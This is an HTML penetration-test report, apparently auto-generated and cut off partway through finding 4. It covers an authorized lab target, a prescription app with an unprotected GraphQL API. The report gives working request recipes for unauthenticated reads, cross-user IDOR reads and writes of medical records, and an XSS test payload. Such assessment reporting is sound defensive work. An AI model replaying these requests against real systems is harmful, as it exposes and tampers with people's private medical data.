@@ -1,0 +1,504 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>VERDICT Report a-mqxdt898-cg2ugy</title><style>
+*{box-sizing:border-box}
+body{font:14px/1.5 -apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif;color:#1a1a1a;margin:0;padding:32px;background:#fff}
+h1{font-size:22px;margin:0 0 4px} h2{font-size:17px;margin:28px 0 10px;border-bottom:2px solid #eee;padding-bottom:4px}
+h3{font-size:15px;margin:18px 0 6px}
+code,pre{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
+pre{background:#f6f8fa;border:1px solid #e3e6ea;border-radius:6px;padding:10px;overflow:auto;font-size:12.5px;white-space:pre-wrap;word-break:break-word}
+.meta{color:#555;font-size:13px;margin:0 0 2px}
+.badge{display:inline-block;color:#fff;border-radius:4px;padding:1px 8px;font-size:12px;font-weight:700;letter-spacing:.3px}
+.sumtags span{display:inline-block;margin:0 6px 6px 0;padding:2px 10px;border-radius:12px;background:#eef1f4;font-size:12px}
+.f{border:1px solid #e3e6ea;border-radius:8px;padding:14px 16px;margin:0 0 14px}
+.f .kv{color:#555;font-size:12.5px;margin:2px 0}
+.f .desc{margin:8px 0}
+table{border-collapse:collapse;width:100%;font-size:13px}
+th,td{border:1px solid #e3e6ea;padding:6px 8px;text-align:left;vertical-align:top}
+th{background:#f6f8fa}
+table.info td:first-child{width:170px;color:#555;font-weight:600;background:#fafbfc}
+.muted{color:#888}
+img.shot{max-width:220px;max-height:140px;border:1px solid #ddd;border-radius:4px}
+.ev{margin:10px 0 0;border-left:3px solid #cdd5dd;padding-left:10px}
+.ev .evh{font-size:12px;color:#555;margin:0 0 4px}
+.ev .lbl{font-size:11px;font-weight:700;letter-spacing:.4px;color:#5f7d8c;margin:6px 0 2px}
+.ev pre{margin:0;max-height:420px}
+html{scroll-behavior:smooth}
+.toc{background:#fafbfc;border:1px solid #e3e6ea;border-radius:8px;padding:10px 16px;margin:14px 0 8px}
+.toc .toctitle{font-weight:700;font-size:12px;color:#555;letter-spacing:.4px;text-transform:uppercase;margin:0 0 6px}
+.toc ul{margin:0;padding-left:18px} .toc>ul{padding-left:16px;list-style:none}
+.toc li{margin:2px 0;font-size:13px} .toc a{color:#0366d6;text-decoration:none} .toc a:hover{text-decoration:underline}
+.toc .sev{font-weight:700;font-size:11px;letter-spacing:.3px}
+@media print{body{padding:0}.f{break-inside:avoid}.ev pre{max-height:none}.toc{break-inside:avoid}}
+</style></head>
+<body>
+<h1>VERDICT Security Assessment Report</h1>
+<nav class="toc"><div class="toctitle">Contents</div><ul>
+<li><a href="#assessment-information">Assessment Information</a></li>
+<li><a href="#scope">Scope</a></li>
+<li><a href="#summary">Summary</a></li>
+<li><a href="#findings">Findings</a><ul>
+<li><a href="#finding-1">1. <span class="sev" style="color:#b00020">CRITICAL</span> [info-disclosure] GraphQL getPrescriptions returns all prescription data without any authentication</a></li>
+<li><a href="#finding-2">2. <span class="sev" style="color:#d32f2f">HIGH</span> [misconfig] GraphQL API enforces no authentication — mutations and queries succeed with no or invalid session</a></li>
+<li><a href="#finding-3">3. <span class="sev" style="color:#d32f2f">HIGH</span> [idor] IDOR: getPrescriptions exposes any user's medical records via userId parameter</a></li>
+<li><a href="#finding-4">4. <span class="sev" style="color:#d32f2f">HIGH</span> [idor-write] Unauthenticated cross-user write via addPrescription — inject prescriptions into any userId's records</a></li>
+<li><a href="#finding-5">5. <span class="sev" style="color:#f57c00">MEDIUM</span> [rate-limit] Login endpoint has no rate limiting/lockout and accepts weak guessable credentials</a></li>
+<li><a href="#finding-6">6. <span class="sev" style="color:#c9a227">LOW</span> [burp] Open redirection (DOM-based)</a></li>
+<li><a href="#finding-7">7. <span class="sev" style="color:#5f7d8c">INFO</span> [burp] Input returned in response (reflected)</a></li>
+<li><a href="#finding-8">8. <span class="sev" style="color:#5f7d8c">INFO</span> [burp] Cross-site scripting (reflected)</a></li>
+</ul></li>
+</ul></nav>
+<h2 id="assessment-information">Assessment Information</h2><table class="info">
+<tr><td>Assessment ID</td><td><code>a-mqxdt898-cg2ugy</code></td></tr>
+<tr><td>Target</td><td><code>http://target.local:5003/</code></td></tr>
+<tr><td>Started</td><td>2026-06-28T06:02:13.631Z</td></tr>
+<tr><td>Generated</td><td>2026-07-02T00:00:00.000Z</td></tr>
+<tr><td>Phase</td><td>report</td></tr>
+<tr><td>Screens</td><td>6 mapped · 6 scanned · 0 remaining</td></tr>
+<tr><td>Hypotheses</td><td>0 (0 confirmed)</td></tr>
+<tr><td>Findings</td><td>8</td></tr>
+<tr><td>Tooling</td><td>VERDICT</td></tr>
+</table>
+<h2 id="scope">Scope</h2><table class="info">
+<tr><td>In-scope hosts</td><td><code>target.local:5003</code></td></tr>
+<tr><td>Out-of-scope hosts</td><td>&mdash;</td></tr>
+<tr><td>In-scope paths</td><td><code>/</code></td></tr>
+<tr><td>Out-of-scope paths</td><td>&mdash;</td></tr>
+<tr><td>Rate</td><td>30 req/min, max 2 concurrent</td></tr>
+</table>
+<h2 id="summary">Summary</h2>
+<p>8 finding(s)</p><p class="sumtags"><span><b style="color:#b00020">1</b> critical</span><span><b style="color:#d32f2f">3</b> high</span><span><b style="color:#f57c00">1</b> medium</span><span><b style="color:#c9a227">1</b> low</span><span><b style="color:#5f7d8c">2</b> info</span></p>
+<h2 id="findings">Findings</h2>
+<div class="f" id="finding-1">
+<h3><span class="badge" style="background:#b00020">CRITICAL</span> 1. [info-disclosure] GraphQL getPrescriptions returns all prescription data without any authentication</h3>
+<div class="kv">Screen: <code>s-0006</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:5003/</div>
+<div class="desc">The `getPrescriptions(userId: Int!)` GraphQL query returns all prescription records for any given userId with no authentication required. Sending a POST to /graphql with Content-Type: application/json and no session cookie or Authorization header successfully returns the complete list of medical prescriptions for any userId. The server performs no auth check — even deliberately invalid session cookies and Bearer tokens are silently ignored. This exposes the full medical prescription database (prescriptionDetails, userId, id) to anonymous callers.</div>
+<div><b>Reproduction</b></div><pre>1. POST http://target.local:5003/graphql with Content-Type: application/json, no cookie, no Authorization header.\n2. Body: {\&quot;query\&quot;:\&quot;{getPrescriptions(userId:2){id userId prescriptionDetails}}\&quot;}\n3. Response: HTTP 200 with all prescriptions for userId=2.\n4. Repeat — identical response confirmed (stable, reproducible).\n5. Invalid queries (e.g. unknown field names) return HTTP 400 with a GraphQL error — confirming only valid authenticated-equivalent queries return data.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqxftook-4m</code> — <code>artifacts/s-0006/ev-mqxftook-4m/</code></div><div class="lbl">REQUEST</div><pre>POST /graphql HTTP/1.1
+Host: target.local:5003
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+Content-Type: application/json
+cookie: &lt;redacted&gt;
+authorization: &lt;redacted&gt;
+
+{&quot;query&quot;: &quot;{ patients { patientId username email } }&quot;}</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 400
+connection: close
+content-length: 113
+content-type: application/json
+date: Sun, 28 Jun 2026 06:58:33 GMT
+server: Werkzeug/3.0.3 Python/3.8.17
+
+{&quot;errors&quot;:[{&quot;message&quot;:&quot;Cannot query field \&quot;patients\&quot; on type \&quot;Query\&quot;.&quot;,&quot;locations&quot;:[{&quot;line&quot;:1,&quot;column&quot;:3}]}]}</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqxg11np-53</code> — <code>artifacts/s-0006/ev-mqxg11np-53/</code></div><div class="lbl">REQUEST</div><pre>POST /graphql HTTP/1.1
+Host: target.local:5003
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+Content-Type: application/json
+cookie: &lt;redacted&gt;
+authorization: &lt;redacted&gt;
+
+{&quot;query&quot;: &quot;{ getPrescriptions(userId: 2) { id userId prescriptionDetails } }&quot;}</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: close
+content-length: 610
+content-type: application/json
+date: Sun, 28 Jun 2026 07:04:17 GMT
+server: Werkzeug/3.0.3 Python/3.8.17
+
+{&quot;data&quot;:{&quot;getPrescriptions&quot;:[{&quot;id&quot;:91,&quot;userId&quot;:2,&quot;prescriptionDetails&quot;:&quot;test survey prescription&quot;},{&quot;id&quot;:92,&quot;userId&quot;:2,&quot;prescriptionDetails&quot;:&quot;test-no-auth&quot;},{&quot;id&quot;:93,&quot;userId&quot;:2,&quot;prescriptionDetails&quot;:&quot;legitimate-prescription-baseline&quot;},{&quot;id&quot;:97,&quot;userId&quot;:2,&quot;prescriptionDetails&quot;:&quot;verdictstoXmqxeucywi3tmsafe&quot;},{&quot;id&quot;:98,&quot;userId&quot;:2,&quot;prescriptionDetails&quot;:&quot;verdictstoXmqxexuv243ousafe&quot;},{&quot;id&quot;:99,&quot;userId&quot;:2,&quot;prescriptionDetails&quot;:&quot;test-with-bad-session&quot;},{&quot;id&quot;:103,&quot;userId&quot;:2,&quot;prescriptionDetails&quot;:&quot;verdictstoXmqxfnigehd55safe&quot;},{&quot;id&quot;:104,&quot;userId&quot;:2,&quot;prescriptionDetails&quot;:&quot;&lt;img src=x onerror=alert(1)&gt;INJECTMARKER42&quot;}]}}</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqxg1671-54</code> — <code>artifacts/s-0006/ev-mqxg1671-54/</code></div><div class="lbl">REQUEST</div><pre>POST /graphql HTTP/1.1
+Host: target.local:5003
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+Content-Type: application/json
+cookie: &lt;redacted&gt;
+authorization: &lt;redacted&gt;
+
+{&quot;query&quot;: &quot;{ getPrescriptions(userId: 2) { id userId prescriptionDetails } }&quot;}</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: close
+content-length: 610
+content-type: application/json
+date: Sun, 28 Jun 2026 07:04:23 GMT
+server: Werkzeug/3.0.3 Python/3.8.17
+
+{&quot;data&quot;:{&quot;getPrescriptions&quot;:[{&quot;id&quot;:91,&quot;userId&quot;:2,&quot;prescriptionDetails&quot;:&quot;test survey prescription&quot;},{&quot;id&quot;:92,&quot;userId&quot;:2,&quot;prescriptionDetails&quot;:&quot;test-no-auth&quot;},{&quot;id&quot;:93,&quot;userId&quot;:2,&quot;prescriptionDetails&quot;:&quot;legitimate-prescription-baseline&quot;},{&quot;id&quot;:97,&quot;userId&quot;:2,&quot;prescriptionDetails&quot;:&quot;verdictstoXmqxeucywi3tmsafe&quot;},{&quot;id&quot;:98,&quot;userId&quot;:2,&quot;prescriptionDetails&quot;:&quot;verdictstoXmqxexuv243ousafe&quot;},{&quot;id&quot;:99,&quot;userId&quot;:2,&quot;prescriptionDetails&quot;:&quot;test-with-bad-session&quot;},{&quot;id&quot;:103,&quot;userId&quot;:2,&quot;prescriptionDetails&quot;:&quot;verdictstoXmqxfnigehd55safe&quot;},{&quot;id&quot;:104,&quot;userId&quot;:2,&quot;prescriptionDetails&quot;:&quot;&lt;img src=x onerror=alert(1)&gt;INJECTMARKER42&quot;}]}}</pre></div>
+</div>
+<div class="f" id="finding-2">
+<h3><span class="badge" style="background:#d32f2f">HIGH</span> 2. [misconfig] GraphQL API enforces no authentication — mutations and queries succeed with no or invalid session</h3>
+<div class="kv">Screen: <code>s-0002</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:5003/</div>
+<div class="desc">The `/graphql` endpoint enforces no authentication on any operation. Both the `addPrescription` mutation and `getPrescriptions` query succeed when called with no session cookie, with an invalid session cookie (`Cookie: session=invalid-session-token-xyz`), and when called cross-user. The `/add_prescription` HTML page correctly returns HTTP 401 for unauthenticated visits, showing the app intends to gate these operations — but the underlying API is completely unprotected. Any anonymous actor can read or write medical prescription records for any user in the system.</div>
+<div><b>Reproduction</b></div><pre>1. Without any session: GET /add_prescription → 401 (auth enforced at the page level).\n2. POST /graphql with body {\&quot;query\&quot;: \&quot;mutation { addPrescription(prescriptionDetails: \\\&quot;test-no-auth\\\&quot;, userId: 2) { prescription { id userId } } }\&quot;} and Cookie: session=invalid-session-token-xyz → HTTP 200, prescription created (id: 99).\n3. Repeat the same mutation without any Cookie header → HTTP 200, prescription created (id: 92).\n4. Contrast: the page returns 401 but the API returns 200 for unauthenticated requests.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqxenu3p-23</code> — <code>artifacts/s-0002/ev-mqxenu3p-23/</code></div><div class="lbl">REQUEST</div><pre>GET /add_prescription HTTP/1.1
+Host: target.local:5003
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 401
+connection: close
+content-length: 317
+content-type: text/html; charset=utf-8
+date: Sun, 28 Jun 2026 06:26:01 GMT
+server: Werkzeug/3.0.3 Python/3.8.17
+vary: Cookie
+
+&lt;!doctype html&gt;
+&lt;html lang=en&gt;
+&lt;title&gt;401 Unauthorized&lt;/title&gt;
+&lt;h1&gt;Unauthorized&lt;/h1&gt;
+&lt;p&gt;The server could not verify that you are authorized to access the URL requested. You either supplied the wrong credentials (e.g. a bad password), or your browser doesn&amp;#39;t understand how to supply the credentials required.&lt;/p&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqxeqq86-2j</code> — <code>artifacts/s-0002/ev-mqxeqq86-2j/</code></div><div class="lbl">REQUEST</div><pre>POST /graphql HTTP/1.1
+Host: target.local:5003
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+Content-Type: application/json
+cookie: &lt;redacted&gt;
+authorization: &lt;redacted&gt;
+
+{&quot;query&quot;: &quot;mutation { addPrescription(prescriptionDetails: \&quot;test-no-auth\&quot;, userId: 2) { prescription { id userId prescriptionDetails flag } } }&quot;}</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: close
+content-length: 115
+content-type: application/json
+date: Sun, 28 Jun 2026 06:28:16 GMT
+server: Werkzeug/3.0.3 Python/3.8.17
+
+{&quot;data&quot;:{&quot;addPrescription&quot;:{&quot;prescription&quot;:{&quot;id&quot;:92,&quot;userId&quot;:2,&quot;prescriptionDetails&quot;:&quot;test-no-auth&quot;,&quot;flag&quot;:null}}}}</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqxf1gne-37</code> — <code>artifacts/s-0002/ev-mqxf1gne-37/</code></div><div class="lbl">REQUEST</div><pre>POST /graphql HTTP/1.1
+Host: target.local:5003
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+Content-Type: application/json
+Cookie: &lt;redacted&gt;
+
+{&quot;query&quot;: &quot;mutation { addPrescription(prescriptionDetails: \&quot;test-with-bad-session\&quot;, userId: 2) { prescription { id userId prescriptionDetails } } }&quot;}</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: close
+content-length: 112
+content-type: application/json
+date: Sun, 28 Jun 2026 06:36:37 GMT
+server: Werkzeug/3.0.3 Python/3.8.17
+
+{&quot;data&quot;:{&quot;addPrescription&quot;:{&quot;prescription&quot;:{&quot;id&quot;:99,&quot;userId&quot;:2,&quot;prescriptionDetails&quot;:&quot;test-with-bad-session&quot;}}}}</pre></div>
+</div>
+<div class="f" id="finding-3">
+<h3><span class="badge" style="background:#d32f2f">HIGH</span> 3. [idor] IDOR: getPrescriptions exposes any user's medical records via userId parameter</h3>
+<div class="kv">Screen: <code>s-0003</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:5003/</div>
+<div class="desc">The GraphQL query `getPrescriptions(userId: Int!)` performs no object-level authorization check. A user authenticated as userId=2 can supply any arbitrary `userId` value and receive the full prescription list for that user. Tested: a user session for userId=2 passing userId=1 receives 85+ prescription records belonging to the admin account (userId=1). Negative control: userId=9999 returns an empty array (32 bytes), proving the parameter is a real DB filter — not a catch-all. Because no server-side check compares the requested userId against the session's identity, any authenticated user can enumerate all other users' private medical records by iterating the userId integer.</div>
+<div><b>Reproduction</b></div><pre>1. POST /login with body {username:user, password:user} → receive session cookie (userID=2).
+2. POST /graphql with Cookie: &lt;session&gt; and body: {&quot;query&quot;:&quot;{ getPrescriptions(userId: 1) { id userId } }&quot;}
+3. Response: HTTP 200, 1954 bytes, 85+ records all with userId:1 (admin's prescriptions).
+4. Negative control: same request with userId: 9999 returns {&quot;data&quot;:{&quot;getPrescriptions&quot;:[]}} (32 bytes) — confirms data isolation at DB level but no authZ enforced.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqxf7um0-3s</code> — <code>artifacts/s-0003/ev-mqxf7um0-3s/</code></div><div class="lbl">REQUEST</div><pre>POST /graphql HTTP/1.1
+Host: target.local:5003
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+Content-Type: application/json
+Cookie: &lt;redacted&gt;
+
+{&quot;query&quot;: &quot;{ getPrescriptions(userId: 9999) { id userId prescriptionDetails } }&quot;}</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: close
+content-length: 32
+content-type: application/json
+date: Sun, 28 Jun 2026 06:41:35 GMT
+server: Werkzeug/3.0.3 Python/3.8.17
+
+{&quot;data&quot;:{&quot;getPrescriptions&quot;:[]}}</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqxf8umo-3t</code> — <code>artifacts/s-0003/ev-mqxf8umo-3t/</code></div><div class="lbl">REQUEST</div><pre>POST /graphql HTTP/1.1
+Host: target.local:5003
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+Content-Type: application/json
+Cookie: &lt;redacted&gt;
+
+{&quot;query&quot;: &quot;{ getPrescriptions(userId: 1) { id userId } }&quot;}</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: close
+content-length: 1954
+content-type: application/json
+date: Sun, 28 Jun 2026 06:42:21 GMT
+server: Werkzeug/3.0.3 Python/3.8.17
+
+{&quot;data&quot;:{&quot;getPrescriptions&quot;:[{&quot;id&quot;:1,&quot;userId&quot;:1},{&quot;id&quot;:2,&quot;userId&quot;:1},{&quot;id&quot;:3,&quot;userId&quot;:1},{&quot;id&quot;:4,&quot;userId&quot;:1},{&quot;id&quot;:5,&quot;userId&quot;:1},{&quot;id&quot;:6,&quot;userId&quot;:1},{&quot;id&quot;:7,&quot;userId&quot;:1},{&quot;id&quot;:8,&quot;userId&quot;:1},{&quot;id&quot;:9,&quot;userId&quot;:1},{&quot;id&quot;:10,&quot;userId&quot;:1},{&quot;id&quot;:11,&quot;userId&quot;:1},{&quot;id&quot;:12,&quot;userId&quot;:1},{&quot;id&quot;:13,&quot;userId&quot;:1},{&quot;id&quot;:14,&quot;userId&quot;:1},{&quot;id&quot;:15,&quot;userId&quot;:1},{&quot;id&quot;:16,&quot;userId&quot;:1},{&quot;id&quot;:17,&quot;userId&quot;:1},{&quot;id&quot;:18,&quot;userId&quot;:1},{&quot;id&quot;:19,&quot;userId&quot;:1},{&quot;id&quot;:20,&quot;userId&quot;:1},{&quot;id&quot;:21,&quot;userId&quot;:1},{&quot;id&quot;:22,&quot;userId&quot;:1},{&quot;id&quot;:23,&quot;userId&quot;:1},{&quot;id&quot;:24,&quot;userId&quot;:1},{&quot;id&quot;:25,&quot;userId&quot;:1},{&quot;id&quot;:26,&quot;userId&quot;:1},{&quot;id&quot;:27,&quot;userId&quot;:1},{&quot;id&quot;:28,&quot;userId&quot;:1},{&quot;id&quot;:29,&quot;userId&quot;:1},{&quot;id&quot;:30,&quot;userId&quot;:1},{&quot;id&quot;:31,&quot;userId&quot;:1},{&quot;id&quot;:32,&quot;userId&quot;:1},{&quot;id&quot;:33,&quot;userId&quot;:1},{&quot;id&quot;:34,&quot;userId&quot;:1},{&quot;id&quot;:35,&quot;userId&quot;:1},{&quot;id&quot;:36,&quot;userId&quot;:1},{&quot;id&quot;:37,&quot;userId&quot;:1},{&quot;id&quot;:38,&quot;userId&quot;:1},{&quot;id&quot;:39,&quot;userId&quot;:1},{&quot;id&quot;:40,&quot;userId&quot;:1},{&quot;id&quot;:41,&quot;userId&quot;:1},{&quot;id&quot;:42,&quot;userId&quot;:1},{&quot;id&quot;:43,&quot;userId&quot;:1},{&quot;id&quot;:44,&quot;userId&quot;:1},{&quot;id&quot;:45,&quot;userId&quot;:1},{&quot;id&quot;:46,&quot;userId&quot;:1},{&quot;id&quot;:47,&quot;userId&quot;:1},{&quot;id&quot;:48,&quot;userId&quot;:1},{&quot;id&quot;:49,&quot;userId&quot;:1},{&quot;id&quot;:50,&quot;userId&quot;:1},{&quot;id&quot;:51,&quot;userId&quot;:1},{&quot;id&quot;:52,&quot;userId&quot;:1},{&quot;id&quot;:53,&quot;userId&quot;:1},{&quot;id&quot;:54,&quot;userId&quot;:1},{&quot;id&quot;:55,&quot;userId&quot;:1},{&quot;id&quot;:56,&quot;userId&quot;:1},{&quot;id&quot;:57,&quot;userId&quot;:1},{&quot;id&quot;:58,&quot;userId&quot;:1},{&quot;id&quot;:59,&quot;userId&quot;:1},{&quot;id&quot;:60,&quot;userId&quot;:1},{&quot;id&quot;:61,&quot;userId&quot;:1},{&quot;id&quot;:62,&quot;userId&quot;:1},{&quot;id&quot;:63,&quot;userId&quot;:1},{&quot;id&quot;:64,&quot;userId&quot;:1},{&quot;id&quot;:65,&quot;userId&quot;:1},{&quot;id&quot;:66,&quot;userId&quot;:1},{&quot;id&quot;:67,&quot;userId&quot;:1},{&quot;id&quot;:68,&quot;userId&quot;:1},{&quot;id&quot;:69,&quot;userId&quot;:1},{&quot;id&quot;:70,&quot;userId&quot;:1},{&quot;id&quot;:71,&quot;userId&quot;:1},{&quot;id&quot;:72,&quot;userId&quot;:1},{&quot;id&quot;:73,&quot;userId&quot;:1},{&quot;id&quot;:74,&quot;userId&quot;:1},{&quot;id&quot;:75,&quot;userId&quot;:1},{&quot;id&quot;:76,&quot;userId&quot;:1},{&quot;id&quot;:77,&quot;userId&quot;:1},{&quot;id&quot;:78,&quot;userId&quot;:1},{&quot;id&quot;:79,&quot;userId&quot;:1},{&quot;id&quot;:80,&quot;userId&quot;:1},{&quot;id&quot;:81,&quot;userId&quot;:1},{&quot;id&quot;:82,&quot;userId&quot;:1},{&quot;id&quot;:83,&quot;userId&quot;:1},{&quot;id&quot;:84,&quot;userId&quot;:1},{&quot;id&quot;:85,&quot;userId&quot;:1},{&quot;id&quot;:86,&quot;userId&quot;:1},{&quot;id&quot;:87,&quot;userId&quot;:1},{&quot;id&quot;:88,&quot;userId&quot;:1},{&quot;id&quot;:89,&quot;userId&quot;:1},{&quot;id&quot;:90,&quot;userId&quot;:1},{&quot;id&quot;:94,&quot;userId&quot;:1},{&quot;id&quot;:95,&quot;userId&quot;:1}]}}</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqxf95qg-3u</code> — <code>artifacts/s-0003/ev-mqxf95qg-3u/</code></div><div class="lbl">REQUEST</div><pre>POST /graphql HTTP/1.1
+Host: target.local:5003
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+Content-Type: application/json
+Cookie: &lt;redacted&gt;
+
+{&quot;query&quot;: &quot;{ getPrescriptions(userId: 1) { id userId } }&quot;}</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: close
+content-length: 1954
+content-type: application/json
+date: Sun, 28 Jun 2026 06:42:36 GMT
+server: Werkzeug/3.0.3 Python/3.8.17
+
+{&quot;data&quot;:{&quot;getPrescriptions&quot;:[{&quot;id&quot;:1,&quot;userId&quot;:1},{&quot;id&quot;:2,&quot;userId&quot;:1},{&quot;id&quot;:3,&quot;userId&quot;:1},{&quot;id&quot;:4,&quot;userId&quot;:1},{&quot;id&quot;:5,&quot;userId&quot;:1},{&quot;id&quot;:6,&quot;userId&quot;:1},{&quot;id&quot;:7,&quot;userId&quot;:1},{&quot;id&quot;:8,&quot;userId&quot;:1},{&quot;id&quot;:9,&quot;userId&quot;:1},{&quot;id&quot;:10,&quot;userId&quot;:1},{&quot;id&quot;:11,&quot;userId&quot;:1},{&quot;id&quot;:12,&quot;userId&quot;:1},{&quot;id&quot;:13,&quot;userId&quot;:1},{&quot;id&quot;:14,&quot;userId&quot;:1},{&quot;id&quot;:15,&quot;userId&quot;:1},{&quot;id&quot;:16,&quot;userId&quot;:1},{&quot;id&quot;:17,&quot;userId&quot;:1},{&quot;id&quot;:18,&quot;userId&quot;:1},{&quot;id&quot;:19,&quot;userId&quot;:1},{&quot;id&quot;:20,&quot;userId&quot;:1},{&quot;id&quot;:21,&quot;userId&quot;:1},{&quot;id&quot;:22,&quot;userId&quot;:1},{&quot;id&quot;:23,&quot;userId&quot;:1},{&quot;id&quot;:24,&quot;userId&quot;:1},{&quot;id&quot;:25,&quot;userId&quot;:1},{&quot;id&quot;:26,&quot;userId&quot;:1},{&quot;id&quot;:27,&quot;userId&quot;:1},{&quot;id&quot;:28,&quot;userId&quot;:1},{&quot;id&quot;:29,&quot;userId&quot;:1},{&quot;id&quot;:30,&quot;userId&quot;:1},{&quot;id&quot;:31,&quot;userId&quot;:1},{&quot;id&quot;:32,&quot;userId&quot;:1},{&quot;id&quot;:33,&quot;userId&quot;:1},{&quot;id&quot;:34,&quot;userId&quot;:1},{&quot;id&quot;:35,&quot;userId&quot;:1},{&quot;id&quot;:36,&quot;userId&quot;:1},{&quot;id&quot;:37,&quot;userId&quot;:1},{&quot;id&quot;:38,&quot;userId&quot;:1},{&quot;id&quot;:39,&quot;userId&quot;:1},{&quot;id&quot;:40,&quot;userId&quot;:1},{&quot;id&quot;:41,&quot;userId&quot;:1},{&quot;id&quot;:42,&quot;userId&quot;:1},{&quot;id&quot;:43,&quot;userId&quot;:1},{&quot;id&quot;:44,&quot;userId&quot;:1},{&quot;id&quot;:45,&quot;userId&quot;:1},{&quot;id&quot;:46,&quot;userId&quot;:1},{&quot;id&quot;:47,&quot;userId&quot;:1},{&quot;id&quot;:48,&quot;userId&quot;:1},{&quot;id&quot;:49,&quot;userId&quot;:1},{&quot;id&quot;:50,&quot;userId&quot;:1},{&quot;id&quot;:51,&quot;userId&quot;:1},{&quot;id&quot;:52,&quot;userId&quot;:1},{&quot;id&quot;:53,&quot;userId&quot;:1},{&quot;id&quot;:54,&quot;userId&quot;:1},{&quot;id&quot;:55,&quot;userId&quot;:1},{&quot;id&quot;:56,&quot;userId&quot;:1},{&quot;id&quot;:57,&quot;userId&quot;:1},{&quot;id&quot;:58,&quot;userId&quot;:1},{&quot;id&quot;:59,&quot;userId&quot;:1},{&quot;id&quot;:60,&quot;userId&quot;:1},{&quot;id&quot;:61,&quot;userId&quot;:1},{&quot;id&quot;:62,&quot;userId&quot;:1},{&quot;id&quot;:63,&quot;userId&quot;:1},{&quot;id&quot;:64,&quot;userId&quot;:1},{&quot;id&quot;:65,&quot;userId&quot;:1},{&quot;id&quot;:66,&quot;userId&quot;:1},{&quot;id&quot;:67,&quot;userId&quot;:1},{&quot;id&quot;:68,&quot;userId&quot;:1},{&quot;id&quot;:69,&quot;userId&quot;:1},{&quot;id&quot;:70,&quot;userId&quot;:1},{&quot;id&quot;:71,&quot;userId&quot;:1},{&quot;id&quot;:72,&quot;userId&quot;:1},{&quot;id&quot;:73,&quot;userId&quot;:1},{&quot;id&quot;:74,&quot;userId&quot;:1},{&quot;id&quot;:75,&quot;userId&quot;:1},{&quot;id&quot;:76,&quot;userId&quot;:1},{&quot;id&quot;:77,&quot;userId&quot;:1},{&quot;id&quot;:78,&quot;userId&quot;:1},{&quot;id&quot;:79,&quot;userId&quot;:1},{&quot;id&quot;:80,&quot;userId&quot;:1},{&quot;id&quot;:81,&quot;userId&quot;:1},{&quot;id&quot;:82,&quot;userId&quot;:1},{&quot;id&quot;:83,&quot;userId&quot;:1},{&quot;id&quot;:84,&quot;userId&quot;:1},{&quot;id&quot;:85,&quot;userId&quot;:1},{&quot;id&quot;:86,&quot;userId&quot;:1},{&quot;id&quot;:87,&quot;userId&quot;:1},{&quot;id&quot;:88,&quot;userId&quot;:1},{&quot;id&quot;:89,&quot;userId&quot;:1},{&quot;id&quot;:90,&quot;userId&quot;:1},{&quot;id&quot;:94,&quot;userId&quot;:1},{&quot;id&quot;:95,&quot;userId&quot;:1}]}}</pre></div>
+</div>
+<div class="f" id="finding-4">
+<h3><span class="badge" style="background:#d32f2f">HIGH</span> 4. [idor-write] Unauthenticated cross-user write via addPrescription — inject prescriptions into any userId's records</h3>
+<div class="kv">Screen: <code>s-0004</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:5003/</div>
+<div class="desc">The addPrescription(prescriptionDetails, userId) GraphQL mutation backing the auth-gated /add_prescription form performs no authorization or authentication checks. An anonymous caller (no cookie, no Authorization) can supply an arbitrary userId and create prescription records in that victim's medical (PII) data set. Demonstrated by creating records id=100 and id=101 under userId=1 (Admin) with a fully unauthenticated request. This is a write-side broken-access-control flaw distinct from the previously confirmed read IDOR on getPrescriptions: it lets an attacker tamper with / poison other users' medical records and seed content (prescriptionDetails is stored unescaped) into the authenticated /view_prescriptions render path. The negative control (a mutation omitting the required userId) is rejected (HTTP 400), proving the 200 successes are genuine writes and not a catch-all.</div>
+<div><b>Reproduction</b></div><pre>1. POST http://target.local:5003/graphql, headers {content-type: application/json, cookie:&quot;&quot;, authorization:&quot;&quot;}, body {&quot;query&quot;:&quot;mutation { addPrescription(prescriptionDetails: \&quot;VERDICT-NOFIELD\&quot;) }&quot;} -&gt; HTTP 400, &quot;argument userId of type Int! is required&quot; (neg control ev-mqxffgp0-42), proving input is validated.
